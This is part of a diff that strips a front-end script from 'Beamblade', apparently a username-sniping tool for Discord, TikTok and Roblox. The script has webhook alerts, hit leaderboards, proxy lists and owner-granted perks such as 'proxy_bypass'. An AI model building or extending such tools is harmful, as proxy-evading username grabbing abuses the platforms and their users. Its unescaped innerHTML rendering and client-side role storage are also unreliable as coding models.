-  const badge = document.getElementById('hits-badge');
-  if (hits.length > 0) { badge.textContent = hits.length; badge.style.display=''; }
-  else badge.style.display='none';
-}
-function renderDashboardIfActive() {
-  if (document.getElementById('page-dashboard')?.classList.contains('active')) renderDashboard();
-}
-
-// ===================== WEBHOOK =====================
-async function triggerWebhook(platform, username) {
-  const webhookUrl = document.getElementById('global-webhook')?.value?.trim()
-    || currentUser?.webhooks?.[0] || DB.get('webhook') || '';
-  if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) return;
-  const payload = {
-    embeds: [{
-      title: '🎯 Username Snagged',
-      description: `**Platform:** ${capitalize(platform)}\n**Username:** \`${username}\``,
-      color: platform==='discord'?5793266 : platform==='tiktok'?0 : 16711680,
-      footer: { text: `Beamblade — by ${currentUser?.displayName || currentUser?.username}` },
-      timestamp: new Date().toISOString()
-    }]
-  };
-  try {
-    await fetch(webhookUrl, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
-  } catch {}
-}
-async function testWebhook() {
-  const url = document.getElementById('settings-webhook')?.value?.trim();
-  if (!url) { showToast('warn','No webhook URL set'); return; }
-  const payload = {
-    embeds: [{ title: 'Beamblade — Webhook Test', description: 'Your webhook is connected and working.', color: 5763719, timestamp: new Date().toISOString() }]
-  };
-  try {
-    const res = await fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
-    if (res.ok) showToast('ok','Webhook sent','Check your Discord channel');
-    else showToast('err','Webhook failed',`Status: ${res.status}`);
-  } catch(e) { showToast('err','Webhook error',e.message); }
-}
-
-// ===================== DASHBOARD =====================
-function renderDashboard() {
-  if (!currentUser) return;
-  const allHits = DB.get('hits') || [];
-  const myHits = allHits.filter(h => h.snipedBy === currentUser.username);
-  document.getElementById('dash-total-hits').textContent = myHits.length;
-  document.getElementById('dash-discord-hits').textContent = myHits.filter(h=>h.platform==='discord').length;
-  document.getElementById('dash-tiktok-hits').textContent = myHits.filter(h=>h.platform==='tiktok').length;
-  document.getElementById('dash-roblox-hits').textContent = myHits.filter(h=>h.platform==='roblox').length;
-  const recent = myHits.slice(-5).reverse();
-  const rContainer = document.getElementById('dash-recent-hits');
-  if (recent.length === 0) {
-    rContainer.innerHTML = '<div class="empty-state"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><p>No hits yet — start sniping</p></div>';
-  } else {
-    rContainer.innerHTML = recent.map(h => `
-      <div style="display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid var(--border);">
-        <span class="platform-chip chip-${h.platform}">${capitalize(h.platform)}</span>
-        <span class="hit-username">${h.username}</span>
-        <span style="margin-left:auto;font-size:12px;color:var(--text-muted);">${timeAgo(h.timestamp)}</span>
-      </div>`).join('');
-  }
-  const activity = (DB.get('activity')||[]).filter(a=>a.user===currentUser.username).slice(0,8);
-  const aContainer = document.getElementById('dash-activity');
-  if (!activity.length) {
-    aContainer.innerHTML = '<div style="color:var(--text-muted);font-size:13px;padding:10px 0;">No recent activity</div>';
-  } else {
-    aContainer.innerHTML = activity.map(a => `
-      <div class="activity-item">
-        <div class="activity-icon">✓</div>
-        <div><div class="activity-text">${a.text}</div><div class="activity-time">${timeAgo(a.time)}</div></div>
-      </div>`).join('');
-  }
-}
-
-// ===================== HITS PAGE =====================
-function renderHits() {
-  if (!currentUser) return;
-  const filter = document.getElementById('hits-filter')?.value || 'all';
-  const allHits = DB.get('hits') || [];
-  let myHits = allHits.filter(h => h.snipedBy === currentUser.username);
-  if (filter !== 'all') myHits = myHits.filter(h => h.platform === filter);
-  myHits.reverse();
-  const container = document.getElementById('hits-content');
-  if (!myHits.length) {
-    container.innerHTML = '<div class="empty-state"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg><p>No hits found</p></div>';
-    return;
-  }
-  container.innerHTML = `<table class="hits-table"><thead><tr><th>Username</th><th>Platform</th><th>Length</th><th>Sniped</th></tr></thead><tbody>
-    ${myHits.map(h=>`<tr><td class="hit-username">${h.username}</td><td><span class="platform-chip chip-${h.platform}">${capitalize(h.platform)}</span></td><td>${h.username.length}</td><td>${timeAgo(h.timestamp)}</td></tr>`).join('')}
-  </tbody></table>`;
-}
-function exportHits() {
-  const hits = (DB.get('hits')||[]).filter(h=>h.snipedBy===currentUser?.username);
-  const csv = 'username,platform,timestamp\n' + hits.map(h=>`${h.username},${h.platform},${new Date(h.timestamp).toISOString()}`).join('\n');
-  const blob = new Blob([csv], {type:'text/csv'});
-  const a = document.createElement('a'); a.href=URL.createObjectURL(blob); a.download='beamblade_hits.csv'; a.click();
-}
-
-// ===================== LEADERBOARD =====================
-function renderLeaderboard() {
-  const hits = DB.get('hits') || [];
-  // Best hits: shortest usernames
-  const sorted = [...hits].sort((a,b)=>a.username.length-b.username.length || a.timestamp-b.timestamp);
-  const bestContainer = document.getElementById('best-hits-content');
-  if (!sorted.length) { bestContainer.innerHTML='<div class="empty-state"><p>No hits recorded yet</p></div>'; }
-  else {
-    bestContainer.innerHTML = `<table class="hits-table"><thead><tr><th>#</th><th>Username</th><th>Platform</th><th>By</th><th>Sniped</th></tr></thead><tbody>
-      ${sorted.slice(0,20).map((h,i)=>`<tr><td class="leaderboard-rank ${i<3?'rank-'+(i+1):''}">${i+1}</td><td class="hit-username">${h.username}</td><td><span class="platform-chip chip-${h.platform}">${capitalize(h.platform)}</span></td><td>${h.displayName||h.snipedBy}</td><td>${timeAgo(h.timestamp)}</td></tr>`).join('')}
-    </tbody></table>`;
-  }
-  // Top snipers: count by user
-  const counts = {};
-  hits.forEach(h => { counts[h.snipedBy] = (counts[h.snipedBy]||0)+1; });
-  const topUsers = Object.entries(counts).sort((a,b)=>b[1]-a[1]).slice(0,10);
-  const topContainer = document.getElementById('top-snipers-content');
-  if (!topUsers.length) { topContainer.innerHTML='<div class="empty-state"><p>No users yet</p></div>'; }
-  else {
-    topContainer.innerHTML = `<table class="hits-table"><thead><tr><th>#</th><th>User</th><th>Total Hits</th></tr></thead><tbody>
-      ${topUsers.map(([u,c],i)=>`<tr><td class="leaderboard-rank ${i<3?'rank-'+(i+1):''}">${i+1}</td><td>${u}</td><td><strong>${c}</strong></td></tr>`).join('')}
-    </tbody></table>`;
-  }
-}
-
-// ===================== SETTINGS =====================
-function loadSettings() {
-  if (!currentUser) return;
-  const dn = document.getElementById('settings-displayname');
-  if (dn) dn.value = currentUser.displayName || '';
-  const wh = document.getElementById('settings-webhook');
-  if (wh) wh.value = currentUser.webhooks?.[0] || '';
-  const pl = document.getElementById('proxy-list');
-  if (pl) pl.value = DB.get('proxies') || '';
-  buildAvatarColors();
-}
-function saveDisplayName() {
-  const val = document.getElementById('settings-displayname').value.trim();
-  if (!val) return;
-  currentUser.displayName = val;
-  const users = DB.get('users') || [];
-  const idx = users.findIndex(u => u.username === currentUser.username);
-  if (idx>-1) { users[idx].displayName = val; DB.set('users', users); }
-  updateSidebar();
-  showToast('ok','Display name updated');
-}
-function saveWebhook() {
-  const val = document.getElementById('settings-webhook').value.trim();
-  currentUser.webhooks = val ? [val] : [];
-  const users = DB.get('users') || [];
-  const idx = users.findIndex(u => u.username === currentUser.username);
-  if (idx>-1) { users[idx].webhooks = currentUser.webhooks; DB.set('users', users); }
-  document.getElementById('global-webhook').value = val;
-  showToast('ok','Webhook saved');
-}
-function saveProxies() {
-  const val = document.getElementById('proxy-list').value.trim();
-  DB.set('proxies', val);
-  const lines = val.split('\n').filter(l=>l.trim());
-  document.getElementById('proxy-status').innerHTML = `<span style="color:var(--success);font-size:13px;">${lines.length} prox${lines.length===1?'y':'ies'} loaded</span>`;
-  showToast('ok',`${lines.length} proxies saved`);
-}
-function clearProxies() {
-  document.getElementById('proxy-list').value = '';
-  DB.set('proxies','');
-  document.getElementById('proxy-status').innerHTML = '<span style="color:var(--text-muted);font-size:13px;">Proxies cleared</span>';
-}
-const AVATAR_COLORS = ['#ffffff','#5865f2','#22c55e','#ef4444','#f59e0b','#a855f7','#06b6d4','#f43f7e','#ff4500','#ffd700'];
-function buildAvatarColors() {
-  const c = document.getElementById('avatar-colors');
-  if (!c) return;
-  c.innerHTML = AVATAR_COLORS.map(col => `
-    <div onclick="setAvatarColor('${col}')" style="width:28px;height:28px;border-radius:50%;background:${col};cursor:pointer;border:2px solid ${col===(currentUser?.avatarColor||'#ffffff')?'var(--text-primary)':'transparent'};transition:all 0.15s;"></div>
-  `).join('');
-}
-function setAvatarColor(col) {
-  if (!currentUser) return;
-  currentUser.avatarColor = col;
-  const users = DB.get('users') || [];
-  const idx = users.findIndex(u => u.username === currentUser.username);
-  if (idx>-1) { users[idx].avatarColor = col; DB.set('users', users); }
-  updateSidebar();
-  buildAvatarColors();
-}
-
-// ===================== OWNER PANEL =====================
-function renderOwnerPanel() {
-  if (!currentUser || currentUser.role !== 'owner') return;
-  renderOwnerUserList();
-  const stats = DB.get('hits') || [];
-  document.getElementById('owner-stats').innerHTML = `
-    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:8px;">
-      <div class="stat-card" style="padding:14px;"><div class="stat-label">Total Hits</div><div class="stat-value" style="font-size:22px;">${stats.length}</div></div>
-      <div class="stat-card" style="padding:14px;"><div class="stat-label">Total Users</div><div class="stat-value" style="font-size:22px;">${(DB.get('users')||[]).length}</div></div>
-    </div>`;
-}
-function renderOwnerUserList() {
-  const search = document.getElementById('owner-search')?.value?.toLowerCase() || '';
-  const users = (DB.get('users') || []).filter(u => u.username !== 'beamblade');
-  const filtered = users.filter(u => u.username.includes(search) || (u.displayName||'').toLowerCase().includes(search));
-  const container = document.getElementById('owner-user-list');
-  if (!filtered.length) { container.innerHTML='<div style="color:var(--text-muted);font-size:13px;padding:10px;">No users found</div>'; return; }
-  container.innerHTML = filtered.map(u => `
-    <div class="user-list-item">
-      <div class="user-list-avatar" style="background:${u.avatarColor||'var(--accent)'};">${(u.displayName||u.username)[0].toUpperCase()}</div>
-      <div class="user-list-info">
-        <div class="user-list-name">${u.displayName||u.username} <span class="user-role-badge ${u.role!=='member'?'role-'+u.role:''}" style="${u.role==='member'?'display:none':''}">${u.role}</span></div>
-        <div class="user-list-meta">@${u.username} · Joined ${timeAgo(u.joinDate)}</div>
-      </div>
-      <div class="user-list-actions">
-        <button class="btn btn-ghost btn-sm" onclick="openManageUser('${u.username}')">Manage</button>
-      </div>
-    </div>`).join('');
-}
-function openManageUser(username) {
-  const users = DB.get('users') || [];
-  const user = users.find(u => u.username === username);
-  if (!user) return;
-  document.getElementById('modal-title').textContent = `Manage — ${user.displayName || user.username}`;
-  document.getElementById('modal-subtitle').textContent = `@${user.username}`;
-  const allPerks = ['speed_boost','turbo','multi_webhook','priority','proxy_bypass','export','custom_prefix','all_themes'];
-  const perkNames = { speed_boost:'Speed Boost',turbo:'Turbo Mode',multi_webhook:'Multi-Webhook',priority:'Priority Queue',proxy_bypass:'Proxy Bypass',export:'Export Access',custom_prefix:'Custom Prefix',all_themes:'All Themes' };
-  document.getElementById('modal-content').innerHTML = `
-    <div class="form-group">
-      <label class="form-label">Role</label>
-      <select class="select-input" id="modal-role">
-        <option value="member" ${user.role==='member'?'selected':''}>Member</option>
-        <option value="vip" ${user.role==='vip'?'selected':''}>VIP</option>
-        <option value="mod" ${user.role==='mod'?'selected':''}>Moderator</option>
-        <option value="admin" ${user.role==='admin'?'selected':''}>Admin</option>
-      </select>
-    </div>
-    <div class="form-group">
-      <label class="form-label">Perks</label>
-      <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
-        ${allPerks.map(p=>`<label style="display:flex;align-items:center;gap:8px;font-size:13px;color:var(--text-secondary);cursor:pointer;"><input type="checkbox" id="perk-${p}" ${(user.perks||[]).includes(p)?'checked':''} style="accent-color:var(--accent);">${perkNames[p]}</label>`).join('')}
-      </div>
-    </div>`;
-  document.getElementById('modal-actions').innerHTML = `
-    <button class="btn btn-ghost btn-sm" onclick="closeModal()">Cancel</button>
-    <button class="btn btn-primary btn-sm" onclick="saveUserManagement('${username}')">Save Changes</button>
-    <button class="btn btn-danger btn-sm" onclick="deleteUser('${username}')">Remove User</button>`;
-  document.getElementById('modal-overlay').classList.add('open');
-}
-function saveUserManagement(username) {
-  const users = DB.get('users') || [];
-  const idx = users.findIndex(u => u.username === username);
-  if (idx === -1) return;
-  const allPerks = ['speed_boost','turbo','multi_webhook','priority','proxy_bypass','export','custom_prefix','all_themes'];
-  users[idx].role = document.getElementById('modal-role').value;
-  users[idx].perks = allPerks.filter(p => document.getElementById(`perk-${p}`)?.checked);
-  DB.set('users', users);
-  closeModal();
-  renderOwnerPanel();
-  showToast('ok',`Updated ${username}`);
-}
-function deleteUser(username) {
-  if (!confirm(`Remove user @${username}? This cannot be undone.`)) return;
-  const users = (DB.get('users')||[]).filter(u=>u.username!==username);
-  DB.set('users', users);
-  closeModal();
-  renderOwnerPanel();
-  showToast('ok','User removed');
-}
-function closeModal(e) {
-  if (e && e.target !== document.getElementById('modal-overlay')) return;
-  document.getElementById('modal-overlay').classList.remove('open');
-}
-
-// ===================== TOAST =====================
-let toastTimer;
-function showToast(type, title, msg='') {
-  const toast = document.getElementById('toast');
-  document.getElementById('toast-icon').textContent = type==='hit'?'🔔':type==='ok'?'✓':type==='err'?'✗':'!';
-  document.getElementById('toast-title').textContent = title;
-  document.getElementById('toast-msg').textContent = msg;
-  toast.className = 'notification-toast show' + (type==='hit'?' hit-notification':'');
-  clearTimeout(toastTimer);
-  toastTimer = setTimeout(() => toast.classList.remove('show'), 4000);
-}
-
-// ===================== UTILS =====================
-function capitalize(s) { return s.charAt(0).toUpperCase()+s.slice(1); }
-function timeAgo(ts) {
-  const d = Date.now() - ts;
-  if (d < 60000) return 'just now';
-  if (d < 3600000) return `${Math.floor(d/60000)}m ago`;
-  if (d < 86400000) return `${Math.floor(d/3600000)}h ago`;
-  return `${Math.floor(d/86400000)}d ago`;
-}
-
-// ===================== INIT =====================
-bootstrap();
-const savedSession = DB.get('session');
-if (savedSession) {
-  const users = DB.get('users') || [];
-  const user = users.find(u => u.username === savedSession);
-  if (user) loginUser(user);
-}
-document.addEventListener('keydown', e => { if(e.key==='Escape') document.getElementById('modal-overlay').classList.remove('open'); });
-</script>
+        })();
+    </script>
 </body>
 </html>
